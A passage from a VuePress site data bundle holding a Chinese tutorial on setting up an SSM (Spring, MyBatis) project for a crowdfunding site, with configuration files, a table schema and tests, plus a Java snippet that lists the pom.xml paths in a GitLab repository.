<artifactId>gson</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n# 1. 创建jdbc.properties\n\njdbc.url=jdbc:mysql://localhost:3306/pro_cf\njdbc.username=root\njdbc.password=123456\njdbc.driver=com.mysql.cj.jdbc.Driver\n\n\n1\n2\n3\n4\n\n\n# 2. 创建mybatis全局配置文件\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE configuration\n        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n  \x3c!--  myabtis 全局配置   --\x3e\n</configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 3. 创建spring整合mybatis配置文件\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">\n\n  \x3c!--加载 数据源配置--\x3e\n  <context:property-placeholder location="classpath:jdbc.properties" />\n\n  <bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource">\n    <property name="url" value="${jdbc.url}" />\n    <property name="driverClassName" value="${jdbc.driver}" />\n    <property name="username" value="${jdbc.username}" />\n    <property name="password" value="${jdbc.password}" />\n  </bean>\n\n  <bean id="sqlSessionFactoryBean" class="org.mybatis.spring.SqlSessionFactoryBean">\n    \x3c!--配置数据源--\x3e\n    <property name="dataSource" ref="dataSource" />\n    \x3c!--myabtis配置文件位置--\x3e\n    <property name="configLocation" value="classpath:mybatis-config.xml" />\n    \x3c!--mapper 配置文件位置--\x3e\n    <property name="mapperLocations" value="classpath:mapper/*.xml" />\n  </bean>\n\n  \x3c!--指定mapper接口扫描--\x3e\n  <bean id="mapperScannerConfigurer" class="org.mybatis.spring.mapper.MapperScannerConfigurer">\n    <property name="basePackage" value="com.pwddd.cf.mapper" />\n  </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# 4. spring整合junit5 测试\n\n引入依赖：\n\n<dependency>\n  <groupId>org.springframework</groupId>\n  <artifactId>spring-test</artifactId>\n  <scope>test</scope>\n</dependency>\n\n<dependency>\n  <groupId>org.junit.jupiter</groupId>\n  <artifactId>junit-jupiter-api</artifactId>\n  <scope>test</scope>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n测试代码：\n\npackage com.pwddd.cf;\n\nimport com.pwddd.cf.entity.Admin;\nimport com.pwddd.cf.mapper.AdminMapper;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.test.context.junit.jupiter.SpringJUnitConfig;\n\nimport javax.sql.DataSource;\nimport java.sql.SQLException;\nimport java.util.UUID;\n\n@SpringJUnitConfig(locations = {"classpath:spring-mybatis.xml"})\npublic class MybatisTest {\n\n    @Autowired\n    private DataSource dataSource;\n\n    @Autowired\n    private AdminMapper adminMapper;\n\n    @Test\n    public void testDateSource() throws SQLException {\n        System.out.println(dataSource.getConnection());\n    }\n\n    @Test\n    public void testMapper(){\n        Admin admin = new Admin(UUID.randomUUID().toString().replace("-",""),\n                "admin", "123456", "zhangsan", "admin@qq.com", null);\n        adminMapper.insertSelective(admin);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n',normalizedContent:'# 尚筹网\n\n\n# 简介\n\n> 尚筹网项目定位为：从单体应用架构到微服务架构过渡的入门项目，项目后台基于传统的ssm框架。\n\n\n# 环境搭建\n\n\n# 创建项目\n\n项目之间的关系依赖图：\n\n根据关系创建对应的maven项目。\n\n\n\n并表示以上的对应关系。(以webui依赖component为例)\n\n<dependencies>\n  <dependency>\n    <groupid>com.pwddd.cf</groupid>\n    <artifactid>cf-admin-component</artifactid>\n    <version>1.0-snapshot</version>\n  </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 数据库设计\n\n# 物理建模\n\n# 理论部分\n\n第一范式：数据库表中的每一列都不可再分，也就是原子性\n\n\n\n这个表中“部门”和“岗位”应该拆分成两个字段：“部门名称”、“岗位”。这样才能够专门针对“部门”或“岗位”进行查询。\n\n\n\n第二范式：在满足第一范式基础上要求每个字段都和主键完整相关，而不是仅和主键部分相关（主要针对联合主键而言）\n\n\n\n“订单详情表”使用“订单编号”和“产品编号”作为联合主键。此时“产品价格”、“产品数量”都和联合主键整体相关，但“订单金额”和“下单时间” 只和联合主键中的“订单编号”相关，和“产品编号”无关。所以只关联了主键中的部分字段，不满足第二范式。把“订单金额”和“下单时间”移到订单表就符合第二范式了。\n\n\n\n第三范式：表中的非主键字段和主键字段直接相关，不允许间接相关。\n\n\n\n上面表中的“部门名称”和“员工编号”的关系是“员工编号”→“部门编号”→“部门名称”，不是直接相关。此时会带来下列问题：\n\n * 数据冗余：“部门名称”多次重复出现。\n\n * 插入异常：组建一个新部门时没有员工信息，也就无法单独插入部门 信息。就算强行插入部门信息，员工表中没有员工信息的记录同样是 非法记录。\n\n * 删除异常：删除员工信息会连带删除部门信息导致部门信息意外丢失。\n\n * 更新异常：哪怕只修改一个部门的名称也要更新多条员工记录。\n\n正确的做法是：把上表拆分成两张表，以外键形式关联。\n\n\n\n“部门编号”和“员工编号”是直接相关的。 第三范式的另一种表述方式是：两张表要通过外键关联，不保存冗余字段。例 如：不能在“员工表”中存储“部门名称”。\n\n# 实践部分\n\n我们在实际的物理建模部分往往并不全部遵循范式的要求。三大范式是设计数据库表结构的规则约束，但是在实际开发中允许局部变通。 比如为了快速查询到关联数据可能会允许冗余字段的存在。例如在员工表中存储部门名称虽然违背第三范式，但是免去了对部门表的关联查询。\n\n设计思路：根据业务功能设计数据库表\n\n * 看得见的字段\n   \n   能够从需求文档或原型页面上直接看到的数据都需要设计对应的数 据库表、字段来存储。\n\n * 看不见的字段\n   \n   除了能够直接从需求文档中看到的字段，实际开发中往往还会包含一 些其他字段来保存其他相关数据。 例如：管理员表需要再增加如下字段以有利于数据维护：主键 、创建时间\n\n * 冗余字段\n   \n   为了避免建表时考虑不周有所遗漏，到后期再修改表结构非常麻烦，所以也有的团队会设置一些额外的冗余字段备用。\n\n * 实际开发对接\n   \n   实际开发中除了一些各个模块都需要使用的公共表在项目启动时创 建好，其他专属于各个模块的表由该模块的负责人创建。但通常开发人员 不能直接操作数据库服务器，所以需要把建表的 sql 语句发送给运维工程 师执行创建操作。\n\n# sql\n\n# 创建数据库\ncreate database\nif\n\tnot exists pro_cf character \n\tset utf8;\n\nuse pro_cf;\n\n# 创建管理员表\ncreate table\nif\n\tnot exists t_admin (\n    id varchar ( 32 ) not null,\n    username varchar ( 32 ) not null,\n    passwd varchar ( 32 ) not null,\n    real_name varchar ( 255 ),\n    email varchar ( 255 ),\n    create_time varchar ( 255 ),\n    primary key ( id ) \n  );\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 逆向工程\n\n# 引入相关依赖\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelversion>4.0.0</modelversion>\n\n  <groupid>com.pwddd.cf</groupid>\n  <artifactid>cf-common-reverse</artifactid>\n  <version>1.0-snapshot</version>\n\n  <properties>\n    <maven.compiler.source>8</maven.compiler.source>\n    <maven.compiler.target>8</maven.compiler.target>\n  </properties>\n\n  <dependencies>\n    <dependency>\n      <groupid>org.mybatis</groupid>\n      <artifactid>mybatis</artifactid>\n      <version>3.5.9</version>\n    </dependency>\n  </dependencies>\n\n  <build>\n    <plugins>\n      <plugin>\n        <groupid>org.mybatis.generator</groupid>\n        <artifactid>mybatis-generator-maven-plugin</artifactid>\n        <version>1.4.0</version>\n\n        \x3c!-- 插件的依赖 --\x3e\n        <dependencies>\n\n          \x3c!-- 逆向工程的核心依赖 --\x3e\n          <dependency>\n            <groupid>org.mybatis.generator</groupid>\n            <artifactid>mybatis-generator-core</artifactid>\n            <version>1.4.0</version>\n          </dependency>\n\n          \x3c!-- 数据库连接池 --\x3e\n          <dependency>\n            <groupid>com.mchange</groupid>\n            <artifactid>c3p0</artifactid>\n            <version>0.9.2</version>\n          </dependency>\n\n          <dependency>\n            <groupid>mysql</groupid>\n            <artifactid>mysql-connector-java</artifactid>\n            <version>8.0.28</version>\n          </dependency>\n\n        </dependencies>\n      </plugin>\n    </plugins>\n  </build>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n# 逆向工程xml\n\n<?xml version="1.0" encoding="utf-8"?>\n<!doctype generatorconfiguration\n        public "-//mybatis.org//dtd mybatis generator configuration 1.0//en"\n        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd">\n<generatorconfiguration>\n\n  \x3c!--\n        targetruntime="mybatis3simple":生成简单版的crud\n        mybatis3:豪华版\n     --\x3e\n  <context id="mysqltables" targetruntime="mybatis3">\n\n    \x3c!--去除注释--\x3e\n    <commentgenerator>\n      <property name="suppressallcomments" value="true"/>\n    </commentgenerator>\n\n    \x3c!-- jdbcconnection：指定如何连接到目标数据库 --\x3e\n    <jdbcconnection driverclass="com.mysql.cj.jdbc.driver"\n                    connectionurl="jdbc:mysql://localhost:3306/pro_cf?allowmultiqueries=true"\n                    userid="root"\n                    password="123456">\n    </jdbcconnection>\n\n    \x3c!--\n          默认为false 把jdbc decimal和numeric类型解析为integer\n          为true时 把jdbc decimal和numeric类型解析为java.math.bigdecimal\n          --\x3e\n    <javatyperesolver >\n      <property name="forcebigdecimals" value="false" />\n    </javatyperesolver>\n\n    \x3c!-- javamodelgenerator：指定javabean的生成策略\n        targetpackage="test.model"：目标包名\n        targetproject="\\mbgtestproject\\src"：目标工程\n        --\x3e\n    <javamodelgenerator targetpackage="com.pwddd.cf.entity"\n                        targetproject="./src/main/java/">\n      \x3c!-- enablesubpackages:是否让 schema 作为包的后缀 --\x3e\n      <property name="enablesubpackages" value="false" />\n      <property name="trimstrings" value="true" />\n    </javamodelgenerator>\n\n    \x3c!-- sqlmapgenerator：sql映射生成策略： --\x3e\n    <sqlmapgenerator targetpackage="mapper"\n                     targetproject="./src/main/resources/">\n      <property name="enablesubpackages" value="false" />\n    </sqlmapgenerator>\n\n    \x3c!-- javaclientgenerator:指定mapper接口所在的位置 --\x3e\n    <javaclientgenerator type="xmlmapper"\n                         targetpackage="com.pwddd.cf.mapper"\n                         targetproject="./src/main/java/">\n      <property name="enablesubpackages" value="false" />\n    </javaclientgenerator>\n\n    \x3c!-- 指定要逆向分析哪些表：根据表要创建javabean --\x3e\n    <table tablename="t_admin" domainobjectname="admin"></table>\n  </context>\n</generatorconfiguration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n# 执行逆向工程\n\n将生成的mapper和实体类移动到指定的位置。\n\n\n# 依赖管理\n\n# 版本声明\n\n<properties>\n  <spring.version>5.3.18</spring.version>\n  <spring.security.version>5.6.2</spring.security.version>\n  <cglib.version>3.3.0</cglib.version>\n  <aspectjweaver.version>1.9.9.1</aspectjweaver.version>\n  <druid.version>1.2.8</druid.version>\n  <mybatis.version>3.5.9</mybatis.version>\n  <mysql.version>8.0.28</mysql.version>\n  <mybatis-spring.version>2.0.6</mybatis-spring.version>\n  <pagehelper.version>5.2.0</pagehelper.version>\n  <jackson-core.version>2.13.2</jackson-core.version>\n  <jackson-databind.version>2.13.2.2</jackson-databind.version>\n</properties>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 父项目依赖管理\n\n<dependencymanagement>\n\n  <dependencies>\n    <dependency>\n      <groupid>org.springframework</groupid>\n      <artifactid>spring-orm</artifactid>\n      <version>${spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework</groupid>\n      <artifactid>spring-webmvc</artifactid>\n      <version>${spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework</groupid>\n      <artifactid>spring-test</artifactid>\n      <version>${spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.aspectj</groupid>\n      <artifactid>aspectjweaver</artifactid>\n      <version>${aspectjweaver.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>cglib</groupid>\n      <artifactid>cglib</artifactid>\n      <version>${cglib.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>com.alibaba</groupid>\n      <artifactid>druid</artifactid>\n      <version>${druid.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.mybatis</groupid>\n      <artifactid>mybatis</artifactid>\n      <version>${mybatis.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>mysql</groupid>\n      <artifactid>mysql-connector-java</artifactid>\n      <version>${mysql.version}</version>\n    </dependency>\n\n    \x3c!-- mybaits 整合 spring   --\x3e\n    <dependency>\n      <groupid>org.mybatis</groupid>\n      <artifactid>mybatis-spring</artifactid>\n      <version>${mybatis-spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>com.github.pagehelper</groupid>\n      <artifactid>pagehelper</artifactid>\n      <version>${pagehelper.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.slf4j</groupid>\n      <artifactid>slf4j-api</artifactid>\n      <version>1.7.36</version>\n    </dependency>\n\n    <dependency>\n      <groupid>ch.qos.logback</groupid>\n      <artifactid>logback-classic</artifactid>\n      <version>1.2.10</version>\n      <scope>test</scope>\n    </dependency>\n\n\n    <dependency>\n      <groupid>org.slf4j</groupid>\n      <artifactid>jcl-over-slf4j</artifactid>\n      <version>1.7.36</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.slf4j</groupid>\n      <artifactid>jul-to-slf4j</artifactid>\n      <version>1.7.36</version>\n    </dependency>\n\n    \x3c!-- spring json   --\x3e\n    <dependency>\n      <groupid>com.fasterxml.jackson.core</groupid>\n      <artifactid>jackson-core</artifactid>\n      <version>${jackson-core.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>com.fasterxml.jackson.core</groupid>\n      <artifactid>jackson-databind</artifactid>\n      <version>${jackson-databind.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>javax.servlet</groupid>\n      <artifactid>jstl</artifactid>\n      <version>1.2</version>\n    </dependency>\n\n    <dependency>\n      <groupid>javax.servlet</groupid>\n      <artifactid>javax.servlet-api</artifactid>\n      <version>4.0.1</version>\n      <scope>provided</scope>\n    </dependency>\n\n    <dependency>\n      <groupid>javax.servlet.jsp</groupid>\n      <artifactid>javax.servlet.jsp-api</artifactid>\n      <version>2.3.3</version>\n      <scope>provided</scope>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework.security</groupid>\n      <artifactid>spring-security-web</artifactid>\n      <version>${spring.security.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework.security</groupid>\n      <artifactid>spring-security-config</artifactid>\n      <version>${spring.security.version}</version>\n    </dependency>\n\n  </dependencies>\n</dependencymanagement>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n\n\n\n# ssm整合\n\n# spring 整合 mybatis\n\n> 目标：使用容器管理mapper，在项目中可以直接调用mapper完成增删改查。\n\n# 0. 引入依赖\n\n依赖的位置：\n\n\n\n<dependency>\n  <groupid>org.springframework</groupid>\n  <artifactid>spring-webmvc</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>org.springframework</groupid>\n  <artifactid>spring-orm</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>org.aspectj</groupid>\n  <artifactid>aspectjweaver</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>cglib</groupid>\n  <artifactid>cglib</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>mysql</groupid>\n  <artifactid>mysql-connector-java</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>org.mybatis</groupid>\n  <artifactid>mybatis</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>org.mybatis</groupid>\n  <artifactid>mybatis-spring</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>com.alibaba</groupid>\n  <artifactid>druid</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>com.github.pagehelper</groupid>\n  <artifactid>pagehelper</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>com.fasterxml.jackson.core</groupid>\n  <artifactid>jackson-core</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>com.fasterxml.jackson.core</groupid>\n  <artifactid>jackson-databind</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>javax.servlet</groupid>\n  <artifactid>jstl</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>com.google.code.gson</groupid>\n  <artifactid>gson</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n# 1. 创建jdbc.properties\n\njdbc.url=jdbc:mysql://localhost:3306/pro_cf\njdbc.username=root\njdbc.password=123456\njdbc.driver=com.mysql.cj.jdbc.driver\n\n\n1\n2\n3\n4\n\n\n# 2. 创建mybatis全局配置文件\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype configuration\n        public "-//mybatis.org//dtd config 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n  \x3c!--  myabtis 全局配置   --\x3e\n</configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 3. 创建spring整合mybatis配置文件\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">\n\n  \x3c!--加载 数据源配置--\x3e\n  <context:property-placeholder location="classpath:jdbc.properties" />\n\n  <bean id="datasource" class="com.alibaba.druid.pool.druiddatasource">\n    <property name="url" value="${jdbc.url}" />\n    <property name="driverclassname" value="${jdbc.driver}" />\n    <property name="username" value="${jdbc.username}" />\n    <property name="password" value="${jdbc.password}" />\n  </bean>\n\n  <bean id="sqlsessionfactorybean" class="org.mybatis.spring.sqlsessionfactorybean">\n    \x3c!--配置数据源--\x3e\n    <property name="datasource" ref="datasource" />\n    \x3c!--myabtis配置文件位置--\x3e\n    <property name="configlocation" value="classpath:mybatis-config.xml" />\n    \x3c!--mapper 配置文件位置--\x3e\n    <property name="mapperlocations" value="classpath:mapper/*.xml" />\n  </bean>\n\n  \x3c!--指定mapper接口扫描--\x3e\n  <bean id="mapperscannerconfigurer" class="org.mybatis.spring.mapper.mapperscannerconfigurer">\n    <property name="basepackage" value="com.pwddd.cf.mapper" />\n  </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# 4. spring整合junit5 测试\n\n引入依赖：\n\n<dependency>\n  <groupid>org.springframework</groupid>\n  <artifactid>spring-test</artifactid>\n  <scope>test</scope>\n</dependency>\n\n<dependency>\n  <groupid>org.junit.jupiter</groupid>\n  <artifactid>junit-jupiter-api</artifactid>\n  <scope>test</scope>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n测试代码：\n\npackage com.pwddd.cf;\n\nimport com.pwddd.cf.entity.admin;\nimport com.pwddd.cf.mapper.adminmapper;\nimport org.junit.jupiter.api.test;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.test.context.junit.jupiter.springjunitconfig;\n\nimport javax.sql.datasource;\nimport java.sql.sqlexception;\nimport java.util.uuid;\n\n@springjunitconfig(locations = {"classpath:spring-mybatis.xml"})\npublic class mybatistest {\n\n    @autowired\n    private datasource datasource;\n\n    @autowired\n    private adminmapper adminmapper;\n\n    @test\n    public void testdatesource() throws sqlexception {\n        system.out.println(datasource.getconnection());\n    }\n\n    @test\n    public void testmapper(){\n        admin admin = new admin(uuid.randomuuid().tostring().replace("-",""),\n                "admin", "123456", "zhangsan", "admin@qq.com", null);\n        adminmapper.insertselective(admin);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n',charsets:{cjk:!0},lastUpdated:"2022/04/25, 00:33:18",lastUpdatedTimestamp:1650846798e3},{title:"代码片段集合",frontmatter:{title:"代码片段集合",date:"2022-09-11T09:00:00.000Z",permalink:"/dev/java/project/code",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","项目实战"],tags:["Java项目"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1013.%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/01.%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5.html",relativePath:"01.开发/101.后端/1013.项目实战/01.代码片段.md",key:"v-1713f0c0",path:"/dev/java/project/code/",headers:[{level:3,title:"列举所有的pom文件路径",slug:"列举所有的pom文件路径",normalizedTitle:"列举所有的pom文件路径",charIndex:2}],headersStr:"列举所有的pom文件路径",content:'# 列举所有的pom文件路径\n\npackage com.pwddd.gitlab;\n\nimport org.gitlab4j.api.GitLabApi;\nimport org.gitlab4j.api.GitLabApiException;\nimport org.gitlab4j.api.models.TreeItem;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class TestAPI {\n\n    private static List<String> ignoreList = new ArrayList<>();\n\n    static {\n        ignoreList.add(".mvn");\n        ignoreList.add(".idea");\n        ignoreList.add("src");\n        ignoreList.add("sql");\n        ignoreList.add("deploy");\n        ignoreList.add("log");\n        ignoreList.add("target");\n        ignoreList.add("bin");\n        ignoreList.add("shell");\n    }\n\n    public static void main(String[] args) {\n        List<String> repoPomPath = getRepoPomPath(2,"master");\n        System.out.println(repoPomPath);\n    }\n\n    public static GitLabApi getGitlabApi(){\n        try {\n            return GitLabApi.oauth2Login("http://192.168.56.103","mic-master","mic-master");\n        } catch (GitLabApiException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static List<String> getRepoPomPath(long projectId,String branch){\n        List<String> repoPomPathList = new ArrayList<>();\n        // 获取链接\n        GitLabApi gitlabApi = getGitlabApi();\n        try {\n            // 项目根目录\n            List<TreeItem> treeItems = gitlabApi.getRepositoryApi().getTree(projectId);\n            // 遍历项目根目录\n            for (TreeItem item :\n                    treeItems) {\n               if (item.getType().equals(TreeItem.Type.TREE)){\n                   // 如果时tree 类型 说明是个文件夹 则需要递归调用\n                   // 非排除的文件夹\n                   if (!ignoreList.contains(item.getName())){\n                       getSubDirPomPath(projectId,branch,item,repoPomPathList);\n                   }else {\n                       System.out.println(item.getPath()+"=======忽略");\n                   }\n                } else {\n                   if (item.getName().equals("pom.xml")){\n                       repoPomPathList.add(item.getPath());\n                       return repoPomPathList;\n                   }\n               }\n            }\n            return repoPomPathList;\n\n        } catch (GitLabApiException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    private static void getSubDirPomPath(long projectId,String branch, TreeItem item, List<String> repoPomPathList) {\n        try {\n            List<TreeItem> items = getGitlabApi().getRepositoryApi().getTree(projectId,item.getPath(),branch);\n            for (TreeItem i : items){\n                if (i.getType().equals(TreeItem.Type.TREE)){\n                    if (!ignoreList.contains(i.getName())){\n                        getSubDirPomPath(projectId,branch,i,repoPomPathList);\n                    }else {\n                        System.out.println(i.getPath()+"=======忽略");\n                    }\n                }else {\n                    if (i.getName().equals("pom.xml")){\n                       repoPomPathList.add(i.getPath());\n                    }\n                }\n            }\n        } catch (GitLabApiException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n',normalizedContent:'# 列举所有的pom文件路径\n\npackage com.pwddd.gitlab;\n\nimport org.gitlab4j.api.gitlabapi;\nimport org.gitlab4j.api.gitlabapiexception;\nimport org.gitlab4j.api.models.treeitem;\n\nimport java.util.arraylist;\nimport java.util.list;\n\npublic class testapi {\n\n    private static list<string> ignorelist = new arraylist<>();\n\n    static {\n        ignorelist.add(".mvn");\n        ignorelist.add(".idea");\n        ignorelist.add("src");\n        ignorelist.add("sql");\n        ignorelist.add("deploy");\n        ignorelist.add("log");\n        ignorelist.add("target");\n        ignorelist.add("bin");\n        ignorelist.add("shell");\n    }\n\n    public static void main(string[] args) {\n        list<string> repopompath = getrepopompath(2,"master");\n        system.out.println(repopompath);\n    }\n\n    public static gitlabapi getgitlabapi(){\n        try {\n            return gitlabapi.oauth2login("http://192.168.56.103","mic-master","mic-master");\n        } catch (gitlabapiexception e) {\n            throw new runtimeexception(e);\n        }\n    }\n\n    public static list<string> getrepopompath(long projectid,string branch){\n        list<string> repopompathlist = new arraylist<>();\n        // 获取链接\n        gitlabapi gitlabapi = getgitlabapi();\n        try {\n            // 项目根目录\n            list<treeitem> treeitems = gitlabapi.getrepositoryapi().gettree(projectid);\n            // 遍历项目根目录\n            for (treeitem item :\n                    treeitems) {\n               if (item.gettype().equals(treeitem.type.tree)){\n                   // 如果时tree 类型 说明是个文件夹 则需要递归调用\n                   // 非排除的文件夹\n                   if (!ignorelist.contains(item.getname())){\n                       getsubdirpompath(projectid,branch,item,repopompathlist);\n                   }else {\n                       system.out.println(item.getpath()+"=======忽略");\n                   }\n                } else {\n                   if (item.getname().equals("pom.xml")){\n                       repopompathlist.add(item.getpath());\n                       return repopompathlist;\n                   }\n               }\n            }\n            return repopompathlist;\n\n        } catch (gitlabapiexception e) {\n            throw new runtimeexception(e);\n        }\n    }\n\n    private static void getsubdirpompath(long projectid,string branch, treeitem item, list<string> repopompathlist) {\n        try {\n            list<treeitem> items = getgitlabapi().getrepositoryapi().gettree(projectid,item.getpath(),branch);\n            for (treeitem i : items){\n                if (i.gettype().equals(treeitem.type.tree)){\n                    if (!ignorelist.contains(i.getname())){\n                        getsubdirpompath(projectid,branch,i,repopompathlist);\n                    }else {\n                        system.out.println(i.getpath()+"=======忽略");\n                    }\n                }else {\n                    if (i.getname().equals("pom.xml")){\n                       repopompathlist.add(i.getpath());\n                    }\n                }\n            }\n        } catch (gitlabapiexception e) {\n            throw new runtimeexception(e);\n        }\n    